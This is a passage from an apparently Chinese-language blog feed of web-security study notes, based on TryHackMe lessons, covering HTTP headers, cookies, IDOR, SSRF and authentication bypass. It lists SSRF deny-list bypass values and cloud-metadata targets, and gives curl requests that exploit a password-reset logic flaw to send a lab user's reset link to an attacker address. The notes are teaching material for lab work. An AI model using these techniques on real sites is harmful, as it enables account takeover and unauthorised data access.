&lt;p&gt;尽管在发出 HTTP 请求时不严格要求标头，但您会发现很难正确查看网站。&lt;/p&gt;
&lt;h3 id=&#34;通用请求标头&#34;&gt;通用请求标头
&lt;/h3&gt;&lt;p&gt;这些是从客户端（通常是您的浏览器）发送到服务器的标头。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Host:&lt;/strong&gt; 一些 Web 服务器托管多个网站，因此通过提供主机标头，您可以告诉它您需要哪个网站，否则您只会收到服务器的默认网站。&lt;/p&gt;
&lt;p&gt;**User-Agent:**这是您的浏览器软件和版本号，告诉 Web 服务器您的浏览器软件有助于它为您的浏览器正确格式化网站，并且 HTML、JavaScript 和 CSS 的某些元素仅在某些浏览器中可用。&lt;/p&gt;
&lt;p&gt;**Content-Length:**将数据发送到 Web 服务器（例如在表单中）时，内容长度会告知 Web 服务器 Web 请求中预期有多少数据。这样，服务器可以确保它不会丢失任何数据。&lt;/p&gt;
&lt;p&gt;**Accept-Encoding:**告诉 Web 服务器浏览器支持哪些类型的压缩方法，以便可以缩小数据以通过 Internet 传输。&lt;/p&gt;
&lt;p&gt;**Cookie:**发送到服务器以帮助记住您的信息的数据（有关更多信息，请参阅 Cookie 任务）。&lt;/p&gt;
&lt;h3 id=&#34;常见响应标头&#34;&gt;常见响应标头
&lt;/h3&gt;&lt;p&gt;这些是在请求后从服务器返回给客户端的标头。&lt;/p&gt;
&lt;p&gt;**Set-Cookie:**要存储的信息将在每个请求中发送回 Web 服务器（请参阅 cookie 任务以了解更多信息）。&lt;/p&gt;
&lt;p&gt;**Cache-Control:**在浏览器再次请求响应之前，将响应内容存储在浏览器的缓存中多长时间。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Content-Type:&lt;/strong&gt; 这会告诉客户端返回什么类型的数据，即 HTML、CSS、JavaScript、图像、PDF、视频等。使用 content-type 标头，浏览器就可以知道如何处理数据。&lt;/p&gt;
&lt;p&gt;**Content-Encoding:**通过 Internet 发送数据时，使用了什么方法来压缩数据以使其更小。&lt;/p&gt;
&lt;h2 id=&#34;cookies&#34;&gt;Cookies
&lt;/h2&gt;&lt;p&gt;它们只是存储在您计算机上的一小段数据。当您从 Web 服务器收到 “Set-Cookie” 标头时，将保存 Cookie。然后，您发出的每个进一步请求，您都会将 cookie 数据发送回 Web 服务器。由于 HTTP 是无状态的（不会跟踪您以前的请求），因此 cookie 可用于提醒 Web 服务器您是谁、网站的一些个人设置或您以前是否访问过该网站。让我们看一下这个 HTTP 请求示例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/image-20250319090916336.png&#34;
	width=&#34;705&#34;
	height=&#34;723&#34;
	srcset=&#34;https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/image-20250319090916336_hu_d71764507b8ed1e.png 480w, https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/image-20250319090916336_hu_c246ceb165cc76ea.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;97&#34;
		data-flex-basis=&#34;234px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;Cookie 可用于多种用途，但最常用于网站身份验证。cookie 值通常不是您可以看到密码的明文字符串，而是令牌（人类不容易猜到的唯一密码）。&lt;/p&gt;
&lt;h3 id=&#34;查看您的-cookie&#34;&gt;查看您的 Cookie
&lt;/h3&gt;&lt;p&gt;您可以在浏览器中使用开发人员工具轻松查看浏览器向网站发送的 Cookie。&lt;/p&gt;
&lt;p&gt;打开开发人员工具后，单击“Network”（网络）选项卡。此选项卡将向您显示浏览器请求的所有资源的列表。您可以单击每个选项以接收请求和响应的详细分类。如果您的浏览器发送了 Cookie，您将在请求的“Cookie”选项卡上看到这些 Cookie。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>IDOR基础</title>
        <link>https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/</guid>
        <description>&lt;img src="https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/638445f84229dc4814eb81dfe06baeb837e3a5e8920ec39035d8dd6e02c0a10d.png" alt="Featured image of post IDOR基础" /&gt;&lt;h1 id=&#34;idor基础&#34;&gt;IDOR基础
&lt;/h1&gt;&lt;h2 id=&#34;什么是idor&#34;&gt;什么是IDOR
&lt;/h2&gt;&lt;p&gt;IDOR（ Insecure Direct Object Reference） 代表不安全的直接对象引用，是一种访问控制漏洞。&lt;/p&gt;
&lt;p&gt;当 Web 服务器收到用户提供的输入以检索对象（文件、数据、文档），对输入数据给予了太多信任，并且未在服务器端对其进行验证以确认所请求的对象属于请求它的用户时，就会发生这种类型的漏洞。&lt;/p&gt;
&lt;h2 id=&#34;示例&#34;&gt;示例
&lt;/h2&gt;&lt;p&gt;假设您刚刚注册了一项在线服务，并且想要更改您的个人资料信息。您单击的链接将转到 &lt;a class=&#34;link&#34; href=&#34;http://online-service.thm/profile?user_id=1305&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://online-service.thm/profile?user_id=1305&lt;/a&gt;，您可以看到您的信息。&lt;/p&gt;
&lt;p&gt;好奇心让您尝试将 user_id 值更改为 1000 （http://online-service.thm/profile?user_id=1000），令您惊讶的是，您现在可以看到其他用户的信息。您现在发现了一个 IDOR 漏洞！理想情况下，应该在网站上进行检查，以确认用户信息属于请求它的用户。&lt;/p&gt;
&lt;h2 id=&#34;在编码中发现idor&#34;&gt;在编码中发现IDOR
&lt;/h2&gt;&lt;p&gt;当通过帖子数据、查询字符串或 cookie 将数据从一个页面传递到另一个页面时，Web 开发人员通常首先会获取原始数据并对其进行编码。编码可确保接收 Web 服务器能够理解内容。编码将二进制数据转换为 ASCII 字符串，通常使用 &lt;code&gt;a-z、A-Z、0-9 和 = &lt;/code&gt;字符 用于填充。Web 上最常见的编码技术是 base64 编码，通常很容易被发现。您可以使用网站 Like &lt;a class=&#34;link&#34; href=&#34;https://www.base64decode.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.base64decode.org/&lt;/a&gt; 解码字符串，然后编辑数据并使用 &lt;a class=&#34;link&#34; href=&#34;https://www.base64encode.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.base64encode.org/&lt;/a&gt; 再次重新编码，然后重新提交 Web 请求以查看响应是否有更改。&lt;/p&gt;
&lt;p&gt;请参阅下图作为此过程的图形示例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/image-20250319134915800.png&#34;
	width=&#34;1183&#34;
	height=&#34;96&#34;
	srcset=&#34;https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/image-20250319134915800_hu_d0f131ae56f606cc.png 480w, https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/image-20250319134915800_hu_9a54cc0d0e68c012.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1232&#34;
		data-flex-basis=&#34;2957px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;哈希idor&#34;&gt;哈希IDOR
&lt;/h2&gt;&lt;p&gt;散 列 ID 比编码的 ID 要复杂一些，但它们可能遵循可预测的模式，例如是整数值的哈希版本。例如，如果使用 md5 哈希，则 ID 号 123 将变为 202cb962ac59075b964b07152d234b70。&lt;/p&gt;
&lt;p&gt;值得将任何发现的哈希值通过 Web 服务，例如 &lt;a class=&#34;link&#34; href=&#34;https://crackstation.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://crackstation.net/&lt;/a&gt;（它有一个包含数十亿个 hash to value 结果的数据库），看看我们是否能找到任何匹配项。&lt;/p&gt;
&lt;h2 id=&#34;unpredictable-ids&#34;&gt;Unpredictable IDs
&lt;/h2&gt;&lt;p&gt;如果使用上述方法无法检测到 ID，则 IDOR 检测的一个很好的方法是创建两个帐户并在它们之间交换 ID 号。如果您可以使用其他用户的 ID 号查看其他用户的内容，同时仍然使用其他账户登录（或根本未登录），则您发现了有效的 IDOR 漏洞。&lt;/p&gt;
&lt;h2 id=&#34;idor在哪里&#34;&gt;IDOR在哪里
&lt;/h2&gt;&lt;p&gt;您所针对的易受攻击的终端节点可能并不总是您在地址栏中看到的。它可能是您的浏览器通过 AJAX 请求加载的内容，或者您在 JavaScript 文件中找到引用的内容。&lt;/p&gt;
&lt;p&gt;有时，终端节点可能有一个未引用的参数，该参数可能在开发过程中有所用处，并被推送到生产环境中。例如，您可能会注意到对 &lt;strong&gt;/user/details&lt;/strong&gt; 的调用显示您的用户信息（通过您的会话进行身份验证）。但是通过一种称为参数挖掘的攻击，您发现了一个名为 &lt;strong&gt;user_id&lt;/strong&gt; 的参数，您可以使用它来显示其他用户的信息，例如 &lt;strong&gt;/user/details？user_id=123&lt;/strong&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>SSRF基础</title>
        <link>https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/</guid>
        <description>&lt;img src="https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/f4a6e2d065c3c9fcd40dfb76bc3317b0d466b12c787faa354faa62457ded2ba5.png" alt="Featured image of post SSRF基础" /&gt;&lt;h1 id=&#34;ssrf基础&#34;&gt;SSRF基础
&lt;/h1&gt;&lt;h2 id=&#34;什么是ssrf&#34;&gt;什么是SSRF
&lt;/h2&gt;&lt;p&gt;SSRF 代表服务器端请求伪造。这是一个漏洞，允许恶意用户使 Web 服务器向攻击者选择的资源发出额外或经过编辑的 HTTP 请求。&lt;/p&gt;
&lt;h2 id=&#34;ssrf-的类型&#34;&gt;SSRF 的类型
&lt;/h2&gt;&lt;p&gt;SSRF 漏洞有两种类型;第一个是常规 SSRF，其中数据返回到攻击者的屏幕。第二个是盲目 SSRF 漏洞，其中发生了 SSRF，但没有信息返回到攻击者的屏幕。&lt;/p&gt;
&lt;h2 id=&#34;影响是什么&#34;&gt;影响是什么？
&lt;/h2&gt;&lt;p&gt;成功的 SSRF 攻击可能导致以下任何情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;进入未经授权的区域。&lt;/li&gt;
&lt;li&gt;访问客户/组织数据。&lt;/li&gt;
&lt;li&gt;能够扩展到内部网络。&lt;/li&gt;
&lt;li&gt;显示身份验证令牌/凭据。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;查找ssrf漏洞&#34;&gt;查找SSRF漏洞
&lt;/h2&gt;&lt;p&gt;可以通过多种不同的方式在 Web 应用程序中发现潜在的 SSRF 漏洞。以下是四个常见位置的示例：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当地址栏的参数中使用完整 URL 时：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153429518.png&#34;
	width=&#34;843&#34;
	height=&#34;68&#34;
	srcset=&#34;https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153429518_hu_9511d7293a12d634.png 480w, https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153429518_hu_182c0825e56883bf.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1239&#34;
		data-flex-basis=&#34;2975px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;表单中的隐藏字段：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153443076.png&#34;
	width=&#34;686&#34;
	height=&#34;159&#34;
	srcset=&#34;https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153443076_hu_c47dd9ff6d21a905.png 480w, https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153443076_hu_b6eab2e01c865fd3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;431&#34;
		data-flex-basis=&#34;1035px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;部分 URL，例如主机名：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153458456.png&#34;
	width=&#34;522&#34;
	height=&#34;70&#34;
	srcset=&#34;https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153458456_hu_5e7b360a2ad68b1f.png 480w, https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153458456_hu_ee35ce65e1026059.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;745&#34;
		data-flex-basis=&#34;1789px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;或者可能只是 URL 的路径：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153510906.png&#34;
	width=&#34;695&#34;
	height=&#34;84&#34;
	srcset=&#34;https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153510906_hu_ccf6309cfad93253.png 480w, https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/image-20250319153510906_hu_d30421f7817b0ac5.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;827&#34;
		data-flex-basis=&#34;1985px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;其中一些示例比其他示例更容易被利用，因此需要进行大量试验和错误才能找到有效的有效负载。&lt;/p&gt;
&lt;p&gt;如果使用盲 SSRF，并且没有输出反射给您，则需要使用外部 HTTP 日志记录工具来监控请求，例如 requestbin.com、您自己的 HTTP 服务器或 Burp Suite 的协作者客户端。&lt;/p&gt;
&lt;h2 id=&#34;常见的防御手段与应对&#34;&gt;常见的防御手段与应对
&lt;/h2&gt;&lt;p&gt;更了解安全漏洞的开发人员意识到 SSRF 漏洞的风险，可以在其应用程序中实施检查，以确保请求的资源符合特定规则。通常有两种方法，拒绝列表或允许列表。&lt;/p&gt;
&lt;h3 id=&#34;拒绝列表&#34;&gt;拒绝列表
&lt;/h3&gt;&lt;p&gt;在拒绝列表 （Deny List） 中，接受除列表中指定的资源或与特定模式匹配的资源之外的所有请求。Web 应用程序可以使用拒绝列表来保护敏感端点、IP 地址或域不被公众访问，同时仍允许访问其他位置。限制访问的特定端点是 localhost，它可能包含服务器性能数据或其他敏感信息，因此 localhost 和 127.0.0.1 等域名会出现在拒绝列表中。攻击者可以使用替代本地主机引用绕过拒绝列表，例如 0、0.0.0.0、0000、127.1、127.&lt;em&gt;.&lt;/em&gt;.*、2130706433、017700000001 或具有解析为 IP 地址 127.0.0.1 的 DNS 记录的子域，例如 127.0.0.1.nip.io。&lt;/p&gt;
&lt;p&gt;此外，在云环境中，阻止对 IP 地址 169.254.169.254 的访问将是有益的，该地址包含已部署云服务器的元数据，包括可能的敏感信息。攻击者可以通过在自己的域上注册一个子域来绕过此问题，该子域的 DNS 记录指向 IP 地址 169.254.169.254。&lt;/p&gt;
&lt;h3 id=&#34;允许列表&#34;&gt;允许列表
&lt;/h3&gt;&lt;p&gt;在允许列表中，除非所有请求都显示在列表中或与特定模式匹配，例如参数中使用的 URL 必须以 &lt;a class=&#34;link&#34; href=&#34;https://website.thm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://website.thm&lt;/a&gt; 开头的规则，否则所有请求都会被拒绝。攻击者可以通过在攻击者的域名上创建子域（例如 &lt;a class=&#34;link&#34; href=&#34;https://website.thm.attackers-domain.thm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://website.thm.attackers-domain.thm&lt;/a&gt;）来快速规避此规则。应用程序逻辑现在将允许此输入，并允许攻击者控制内部 HTTP 请求。&lt;/p&gt;
&lt;h3 id=&#34;打开重定向&#34;&gt;打开重定向
&lt;/h3&gt;&lt;p&gt;如果上述绕过不起作用，那么攻击者还有一个技巧，即开放重定向。开放重定向是服务器上的一个端点，网站访问者会在其中自动重定向到另一个网站地址。以 link https://website 为例。thm/link？url=https：//tryhackme.com 的创建此端点是为了记录访客出于广告/营销目的点击此链接的次数。但是想象一下，存在一个潜在的 SSRF 漏洞，其严格的规则只允许以 https://website 开头的 URL。thm/。攻击者可以利用上述功能将内部 HTTP 请求重定向到攻击者选择的域。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>身份验证绕过</title>
        <link>https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/</guid>
        <description>&lt;img src="https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/5e5493849d8aa623ccc456998df80032a5625b429097b062a957b14d4fce5079.png" alt="Featured image of post 身份验证绕过" /&gt;&lt;h1 id=&#34;身份验证绕过&#34;&gt;身份验证绕过
&lt;/h1&gt;&lt;h2 id=&#34;用户名枚举&#34;&gt;用户名枚举
&lt;/h2&gt;&lt;h2 id=&#34;暴力&#34;&gt;暴力
&lt;/h2&gt;&lt;h2 id=&#34;逻辑缺陷&#34;&gt;逻辑缺陷
&lt;/h2&gt;&lt;h3 id=&#34;什么是逻辑缺陷&#34;&gt;什么是逻辑缺陷？
&lt;/h3&gt;&lt;p&gt;有时身份验证过程包含逻辑缺陷。逻辑缺陷是指应用程序的典型逻辑路径被黑客绕过、规避或纵。逻辑缺陷可以存在于网站的任何区域，但在这种情况下，我们将专注于与身份验证相关的示例。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/image-20250319103332643.png&#34;
	width=&#34;760&#34;
	height=&#34;360&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/image-20250319103332643_hu_656c10d9b933eb75.png 480w, https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/image-20250319103332643_hu_4361eaaa2d8c6db.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;211&#34;
		data-flex-basis=&#34;506px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;逻辑缺陷示例&#34;&gt;逻辑缺陷示例
&lt;/h3&gt;&lt;p&gt;下面的模拟代码示例检查客户端正在访问的路径的开头是否以 /admin 开头，如果是，则进行进一步检查以查看客户端是否实际上是 admin。如果页面不以 /admin 开头，则会向客户端显示该页面。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;if( url.substr(0,6) === &amp;#39;/admin&amp;#39;) {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    # Code to check user is an admin
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;} else {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    # View Page
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;因为上面的 PHP 代码示例使用了三个等号 （===），所以它正在查找字符串的完全匹配项，包括相同的字母大小写。该代码存在逻辑缺陷，因为请求 &lt;strong&gt;/adMin&lt;/strong&gt; 的未经身份验证的用户将不会检查其权限，而是向他们显示页面，从而完全绕过身份验证检查。&lt;/p&gt;
&lt;h3 id=&#34;逻辑缺陷实用&#34;&gt;逻辑缺陷实用
&lt;/h3&gt;&lt;p&gt;我们将检查 Acme IT 支持网站 （http：//MACHINE_IP/customers/reset） 的重置密码 功能。我们看到一个表单，要求提供与我们希望执行密码重置的账户关联的电子邮件地址。如果输入的电子邮件无效，您将收到错误消息&lt;strong&gt;Account not found from provided email address&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;出于演示目的，我们将使用 email address &lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;mailto:robert@acmeitsupport.thm&#34; &gt;robert@acmeitsupport.thm&lt;/a&gt;&lt;/strong&gt;被接受。然后，我们会看到表单的下一阶段，该阶段要求提供与此登录电子邮件地址关联的用户名。如果我们输入 robert 作为用户名并按下 Check Username 按钮，您将看到一条确认消息，告知将向 &lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;mailto:robert@acmeitsupport.thm&#34; &gt;robert@acmeitsupport.thm&lt;/a&gt;&lt;/strong&gt;发送一封密码重置电子邮件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/image-20250319105628978.png&#34;
	width=&#34;516&#34;
	height=&#34;248&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/image-20250319105628978_hu_607adc598db96329.png 480w, https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/image-20250319105628978_hu_f3ac7279bb5375f9.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;208&#34;
		data-flex-basis=&#34;499px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;在此阶段，您可能想知道此应用程序中的漏洞可能是什么，因为您必须知道电子邮件和用户名，然后将密码链接发送到帐户所有者的电子邮件地址。&lt;/p&gt;
&lt;p&gt;在重置电子邮件过程的第二步中，用户名在 POST 字段中提交到 Web 服务器，电子邮件地址在查询字符串请求中作为 GET 字段发送。&lt;/p&gt;
&lt;p&gt;让我们通过使用 curl 工具手动向 Web 服务器发出请求来说明这一点。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@tryhackme$ curl &amp;#39;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm&amp;#39; -H &amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39; -d &amp;#39;username=robert&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们使用该标志向请求添加额外的标头。在这种情况下，我们将 设置为 ，这让 Web 服务器知道我们正在发送表单数据，以便它正确理解我们的请求。&lt;/p&gt;
&lt;p&gt;在应用程序中，使用查询字符串检索用户帐户，但稍后，在应用程序逻辑中，使用 PHP 变量 &lt;code&gt;$_REQUEST&lt;/code&gt; 中的数据发送密码重置电子邮件。&lt;/p&gt;
&lt;p&gt;PHP&lt;code&gt;$_REQUEST&lt;/code&gt; 变量是一个数组，其中包含从查询字符串接收的数据和 POST 数据。如果查询字符串和 POST 数据使用相同的键名称，则此变量的应用程序逻辑优先使用 POST 数据字段而不是查询字符串，因此，如果我们向 POST 表单添加另一个参数，我们可以控制密码重置电子邮件的发送位置。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@tryhackme$ curl &amp;#39;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm&amp;#39; -H &amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39; -d &amp;#39;username=robert&amp;amp;email=attacker@hacker.com&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/image-20250319110039108.png&#34;
	width=&#34;475&#34;
	height=&#34;259&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/image-20250319110039108_hu_13150a87f45863.png 480w, https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/image-20250319110039108_hu_821b855b9246423d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;183&#34;
		data-flex-basis=&#34;440px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;**下一步，您需要在 Acme IT 支持客户部分创建一个帐户，这样做会为您提供一个可用于创建支持票证的唯一电子邮件地址。电子邮件地址的格式为 &lt;code&gt;{username}&lt;/code&gt;@customer.acmeitsupport.thm&lt;/p&gt;
&lt;p&gt;现在重新运行 &lt;strong&gt;Curl 请求 2&lt;/strong&gt;，但使用您的 @acmeitsupport。thm 在电子邮件字段中，您将在您的帐户上创建一个票证，其中包含一个链接，用于以 Robert 身份登录。使用 Robert 的帐户，您可以查看他们的支持票证并显示标志。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@tryhackme:~$ curl &amp;#39;http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm&amp;#39; -H &amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39; -d &amp;#39;username=robert&amp;amp;email={username}@customer.acmeitsupport.thm&amp;#39;
